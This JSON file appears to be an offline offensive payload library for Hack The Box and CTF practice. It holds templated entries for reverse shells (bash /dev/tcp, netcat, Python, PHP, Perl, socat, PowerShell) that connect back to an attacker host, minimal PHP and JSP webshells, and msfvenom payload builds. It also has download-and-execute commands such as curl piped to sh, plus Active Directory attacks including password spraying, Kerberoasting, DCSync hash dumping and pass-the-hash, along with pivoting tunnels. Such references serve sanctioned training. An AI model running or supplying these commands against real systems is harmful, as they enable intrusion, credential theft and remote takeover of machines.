{
  "_comment": "Offline payload & technique library for HTB/CTF. Placeholders {LHOST} {LPORT} {TARGET} {PORT} are substituted at render time; unknown ones are left intact. No AI required.",
  "entries": [
    {"id": "rev-bash", "name": "Bash reverse shell (/dev/tcp)", "category": "reverse-shell", "platform": "linux", "tags": ["shell"], "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", "notes": "Run on target. Needs a real bash."},
    {"id": "rev-nc-mkfifo", "name": "netcat mkfifo reverse shell", "category": "reverse-shell", "platform": "linux", "tags": ["shell"], "template": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f", "notes": "Works when nc has no -e."},
    {"id": "rev-nc-e", "name": "netcat -e reverse shell", "category": "reverse-shell", "platform": "linux", "tags": ["shell"], "template": "nc -e /bin/sh {LHOST} {LPORT}", "notes": "Only if nc supports -e."},
    {"id": "rev-python", "name": "Python3 PTY reverse shell", "category": "reverse-shell", "platform": "linux", "tags": ["shell"], "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", "notes": "Gives a semi-interactive PTY."},
    {"id": "rev-php", "name": "PHP reverse shell", "category": "reverse-shell", "platform": "linux", "tags": ["shell", "http"], "template": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "notes": "Useful via web RCE."},
    {"id": "rev-perl", "name": "Perl reverse shell", "category": "reverse-shell", "platform": "linux", "tags": ["shell"], "template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'", "notes": ""},
    {"id": "rev-socat", "name": "socat fully-interactive reverse shell", "category": "reverse-shell", "platform": "linux", "tags": ["shell"], "template": "socat TCP:{LHOST}:{LPORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane", "notes": "Listener: socat file:`tty`,raw,echo=0 TCP-L:{LPORT}"},
    {"id": "rev-powershell", "name": "PowerShell reverse shell", "category": "reverse-shell", "platform": "windows", "tags": ["shell", "windows"], "template": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\"", "notes": "Windows target."},
    {"id": "tty-python", "name": "Upgrade shell to PTY (python)", "category": "tty-upgrade", "platform": "linux", "tags": ["shell"], "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "notes": "Then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"},
    {"id": "tty-script", "name": "Upgrade shell to PTY (script)", "category": "tty-upgrade", "platform": "linux", "tags": ["shell"], "template": "script -qc /bin/bash /dev/null", "notes": "Alternative when python is absent."},
    {"id": "webshell-php", "name": "Minimal PHP webshell", "category": "webshell", "platform": "linux", "tags": ["http", "web"], "template": "<?php system($_GET['cmd']); ?>", "notes": "Drop as cmd.php; call ?cmd=id"},
    {"id": "webshell-jsp", "name": "Minimal JSP webshell", "category": "webshell", "platform": "any", "tags": ["http", "web"], "template": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "notes": "For Tomcat/JSP apps."},
    {"id": "msf-linux-elf", "name": "msfvenom Linux ELF reverse shell", "category": "msfvenom", "platform": "linux", "tags": ["payload"], "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf", "notes": "Or: breachload payload <cfg> --payload linux/x64/shell_reverse_tcp --lhost {LHOST}"},
    {"id": "msf-windows-exe", "name": "msfvenom Windows EXE reverse shell", "category": "msfvenom", "platform": "windows", "tags": ["payload", "windows"], "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe", "notes": ""},
    {"id": "msf-php", "name": "msfvenom PHP reverse shell", "category": "msfvenom", "platform": "linux", "tags": ["payload", "http"], "template": "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php", "notes": "For PHP web upload/RCE."},
    {"id": "msf-war", "name": "msfvenom WAR (Tomcat) reverse shell", "category": "msfvenom", "platform": "any", "tags": ["payload", "http"], "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war", "notes": "Deploy to Tomcat manager."},
    {"id": "msf-aspx", "name": "msfvenom ASPX reverse shell", "category": "msfvenom", "platform": "windows", "tags": ["payload", "http", "windows"], "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx", "notes": "For IIS/ASP.NET upload."},
    {"id": "listen-nc", "name": "netcat listener", "category": "listener", "platform": "any", "tags": ["listener"], "template": "nc -lvnp {LPORT}", "notes": "Catch a reverse shell."},
    {"id": "listen-rlwrap", "name": "rlwrap netcat listener (arrow keys)", "category": "listener", "platform": "any", "tags": ["listener"], "template": "rlwrap nc -lvnp {LPORT}", "notes": "Nicer line editing."},
    {"id": "xfer-http-server", "name": "Serve files over HTTP (attacker)", "category": "transfer", "platform": "any", "tags": ["transfer"], "template": "python3 -m http.server 80", "notes": "Run in the dir with your tools."},
    {"id": "xfer-wget", "name": "Download to target (wget)", "category": "transfer", "platform": "linux", "tags": ["transfer"], "template": "wget http://{LHOST}/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf", "notes": ""},
    {"id": "xfer-curl", "name": "Download to target (curl)", "category": "transfer", "platform": "linux", "tags": ["transfer"], "template": "curl http://{LHOST}/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf", "notes": ""},
    {"id": "xfer-ps-download", "name": "Download to target (PowerShell)", "category": "transfer", "platform": "windows", "tags": ["transfer", "windows"], "template": "powershell -c \"Invoke-WebRequest http://{LHOST}/shell.exe -OutFile C:\\\\Windows\\\\Temp\\\\shell.exe\"", "notes": ""},
    {"id": "enum-suid", "name": "Find SUID binaries", "category": "privesc-linux", "platform": "linux", "tags": ["privesc"], "template": "find / -perm -4000 -type f 2>/dev/null", "notes": "Cross-check with GTFOBins."},
    {"id": "enum-sudo", "name": "Check sudo rights", "category": "privesc-linux", "platform": "linux", "tags": ["privesc"], "template": "sudo -l", "notes": "NOPASSWD entries = quick win."},
    {"id": "enum-caps", "name": "Find file capabilities", "category": "privesc-linux", "platform": "linux", "tags": ["privesc"], "template": "getcap -r / 2>/dev/null", "notes": "cap_setuid on python/perl = root."},
    {"id": "enum-cron", "name": "List cron jobs", "category": "privesc-linux", "platform": "linux", "tags": ["privesc"], "template": "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null", "notes": "Look for writable scripts."},
    {"id": "enum-linpeas", "name": "Run linPEAS from attacker", "category": "privesc-linux", "platform": "linux", "tags": ["privesc"], "template": "curl http://{LHOST}/linpeas.sh | sh", "notes": "Serve linpeas.sh with xfer-http-server first."},
    {"id": "win-priv", "name": "Windows token privileges", "category": "privesc-windows", "platform": "windows", "tags": ["privesc", "windows"], "template": "whoami /priv", "notes": "SeImpersonate => Potato attacks."},
    {"id": "win-systeminfo", "name": "Windows systeminfo (for exploit-suggester)", "category": "privesc-windows", "platform": "windows", "tags": ["privesc", "windows"], "template": "systeminfo", "notes": "Feed to windows-exploit-suggester."},
    {"id": "svc-ftp-anon", "name": "Try anonymous FTP", "category": "service", "platform": "any", "tags": ["ftp"], "template": "ftp {TARGET}    # login: anonymous / anonymous", "notes": "Check for readable/writable files."},
    {"id": "svc-smb-null", "name": "SMB null-session share listing", "category": "service", "platform": "any", "tags": ["smb"], "template": "smbclient -N -L //{TARGET}/", "notes": "Then smbclient -N //{TARGET}/<share>"},
    {"id": "svc-smb-enum", "name": "Full SMB enumeration", "category": "service", "platform": "any", "tags": ["smb"], "template": "enum4linux-ng -A {TARGET}", "notes": "Users, shares, policy."},
    {"id": "svc-http-fuzz", "name": "HTTP content discovery", "category": "service", "platform": "any", "tags": ["http"], "template": "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://{TARGET}:{PORT}/FUZZ", "notes": "Also try raft-medium-directories.txt"},
    {"id": "svc-rdp", "name": "Connect over RDP", "category": "service", "platform": "windows", "tags": ["rdp", "windows"], "template": "xfreerdp /v:{TARGET} /u:Administrator /p:'password' +clipboard", "notes": "Use creds you found."},
    {"id": "ad-nxc-smb", "name": "netexec SMB enum (authenticated)", "category": "ad", "platform": "windows", "tags": ["ad", "smb"], "template": "nxc smb {TARGET} -u {USER} -p '{PASS}' --shares --users --groups --pass-pol", "notes": "Add -d {DOMAIN}; use -H <hash> for pass-the-hash."},
    {"id": "ad-nxc-spray", "name": "netexec password spray", "category": "ad", "platform": "windows", "tags": ["ad", "smb"], "template": "nxc smb {TARGET} -u users.txt -p 'Season2024!' --continue-on-success", "notes": "One password across many users avoids lockout."},
    {"id": "ad-bloodhound", "name": "BloodHound collection (python)", "category": "ad", "platform": "windows", "tags": ["ad", "bloodhound"], "template": "bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {TARGET} -c All --zip", "notes": "Import the zip; hunt shortest paths to Domain Admins."},
    {"id": "ad-kerberoast", "name": "Kerberoasting (GetUserSPNs)", "category": "ad", "platform": "windows", "tags": ["ad", "kerberos"], "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {TARGET} -request -outputfile kerb.txt", "notes": "Crack: hashcat -m 13100 kerb.txt rockyou.txt"},
    {"id": "ad-asrep", "name": "AS-REP roasting (GetNPUsers)", "category": "ad", "platform": "windows", "tags": ["ad", "kerberos"], "template": "impacket-GetNPUsers {DOMAIN}/ -dc-ip {TARGET} -usersfile users.txt -no-pass -request", "notes": "For DONT_REQ_PREAUTH users. Crack: hashcat -m 18200"},
    {"id": "ad-certipy-find", "name": "ADCS enum (certipy)", "category": "ad", "platform": "windows", "tags": ["ad", "adcs"], "template": "certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {TARGET} -stdout -vulnerable", "notes": "Flags ESC1-ESC16 misconfigurations."},
    {"id": "ad-secretsdump", "name": "DCSync / hash dump (secretsdump)", "category": "ad", "platform": "windows", "tags": ["ad", "dcsync"], "template": "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{TARGET}", "notes": "Needs DCSync rights or local admin on the DC."},
    {"id": "ad-bloodyad", "name": "ACL abuse (bloodyAD)", "category": "ad", "platform": "windows", "tags": ["ad", "acl"], "template": "bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' get writable", "notes": "Then add genericAll / set password / add groupMember."},
    {"id": "ad-evil-winrm", "name": "WinRM shell (evil-winrm)", "category": "ad", "platform": "windows", "tags": ["ad", "winrm", "shell"], "template": "evil-winrm -i {TARGET} -u {USER} -p '{PASS}'", "notes": "Port 5985. Use -H <hash> for pass-the-hash."},
    {"id": "ad-psexec", "name": "SMB exec shell (psexec)", "category": "ad", "platform": "windows", "tags": ["ad", "shell"], "template": "impacket-psexec {DOMAIN}/{USER}:'{PASS}'@{TARGET}", "notes": "Needs local admin. Also smbexec / wmiexec / atexec."},
    {"id": "pivot-chisel-server", "name": "chisel SOCKS server (attacker)", "category": "pivot", "platform": "any", "tags": ["pivot"], "template": "chisel server -p 8000 --reverse", "notes": "Run on your box; then the client below on the pivot host."},
    {"id": "pivot-chisel-client", "name": "chisel reverse SOCKS client (pivot host)", "category": "pivot", "platform": "any", "tags": ["pivot"], "template": "./chisel client {LHOST}:8000 R:socks", "notes": "Opens a SOCKS5 proxy on your :1080. proxychains through it."},
    {"id": "pivot-ligolo", "name": "ligolo-ng agent (pivot host)", "category": "pivot", "platform": "any", "tags": ["pivot"], "template": "./agent -connect {LHOST}:11601 -ignore-cert", "notes": "On your box: ligolo-ng proxy, then 'session' + add the internal route."},
    {"id": "pivot-ssh-socks", "name": "SSH dynamic SOCKS proxy", "category": "pivot", "platform": "linux", "tags": ["pivot"], "template": "ssh -D 1080 -N {USER}@{TARGET}", "notes": "SOCKS5 on :1080 through a host you have SSH on."},
    {"id": "pivot-ssh-local", "name": "SSH local port forward", "category": "pivot", "platform": "linux", "tags": ["pivot"], "template": "ssh -L 8080:127.0.0.1:80 -N {USER}@{TARGET}", "notes": "Reach an internal-only service on the pivot host."},
    {"id": "pivot-sshuttle", "name": "sshuttle transparent VPN", "category": "pivot", "platform": "linux", "tags": ["pivot"], "template": "sshuttle -r {USER}@{TARGET} 172.16.0.0/24", "notes": "Route a whole internal subnet through the pivot, no proxychains."},
    {"id": "pivot-proxychains", "name": "proxychains through the SOCKS proxy", "category": "pivot", "platform": "any", "tags": ["pivot"], "template": "proxychains -q nmap -sT -Pn -p 445,3389,5985 <internal-host>", "notes": "TCP-connect scans only through SOCKS. Set socks5 127.0.0.1 1080 in proxychains.conf."},
    {"id": "web-nikto", "name": "nikto web vulnerability scan", "category": "web", "platform": "any", "tags": ["http", "web"], "template": "nikto -h http://{TARGET}:{PORT}", "notes": "Fast misconfig/known-file scan; noisy."},
    {"id": "web-feroxbuster", "name": "feroxbuster recursive content discovery", "category": "web", "platform": "any", "tags": ["http", "web"], "template": "feroxbuster -u http://{TARGET}:{PORT} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html", "notes": "Recursive; add -k for https."},
    {"id": "web-wpscan", "name": "wpscan WordPress enumeration", "category": "web", "platform": "any", "tags": ["http", "web", "wordpress"], "template": "wpscan --url http://{TARGET}:{PORT} --enumerate u,vp,vt --plugins-detection aggressive", "notes": "Add --api-token for CVE data. -U/-P for login brute."},
    {"id": "web-gobuster-vhost", "name": "gobuster virtual-host discovery", "category": "web", "platform": "any", "tags": ["http", "web", "vhost"], "template": "gobuster vhost -u http://{TARGET}:{PORT} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain", "notes": "Finds name-based vhosts; add the domain to /etc/hosts."},
    {"id": "web-git-dumper", "name": "dump an exposed .git repository", "category": "web", "platform": "any", "tags": ["http", "web"], "template": "git-dumper http://{TARGET}:{PORT}/.git/ loot/git", "notes": "If /.git/ is exposed; recover source and secrets from history."},
    {"id": "svc-snmp-onesixtyone", "name": "SNMP community brute (onesixtyone)", "category": "service", "platform": "any", "tags": ["snmp"], "template": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {TARGET}", "notes": "Find the community string; often 'public'."},
    {"id": "svc-snmpwalk", "name": "SNMP walk (dump MIB)", "category": "service", "platform": "any", "tags": ["snmp"], "template": "snmpwalk -v2c -c public {TARGET}", "notes": "Try -c public/private. snmpwalk ...1.3.6.1.4.1.77.1.2.25 = users; .4.2.1.2 = processes."},
    {"id": "svc-smtp-userenum", "name": "SMTP user enumeration", "category": "service", "platform": "any", "tags": ["smtp"], "template": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D {DOMAIN} -t {TARGET}", "notes": "Also -M VRFY / EXPN. Valid users feed spraying."},
    {"id": "svc-smtp-relay", "name": "SMTP open-relay test (swaks)", "category": "service", "platform": "any", "tags": ["smtp"], "template": "swaks --to test@example.com --from attacker@{TARGET} --server {TARGET}", "notes": "Confirms open relay / lets you phish internally."},
    {"id": "svc-nfs-showmount", "name": "NFS export listing + mount", "category": "service", "platform": "any", "tags": ["nfs"], "template": "showmount -e {TARGET}   # then: mount -t nfs {TARGET}:/export /mnt -o nolock", "notes": "no_root_squash exports = write a SUID root binary."},
    {"id": "svc-rpc-enum", "name": "RPC / MSRPC enumeration", "category": "service", "platform": "any", "tags": ["rpc"], "template": "rpcclient -U '' -N {TARGET}   # then: enumdomusers, querydispinfo, lsaquery", "notes": "Null-session MSRPC user/domain enumeration."},
    {"id": "svc-ldap-anon", "name": "Anonymous LDAP dump", "category": "service", "platform": "any", "tags": ["ldap"], "template": "ldapsearch -x -H ldap://{TARGET} -b \"DC={DOMAIN}\" \"(objectClass=user)\"", "notes": "Anonymous bind sometimes leaks users / descriptions (passwords!)."}
  ]
}
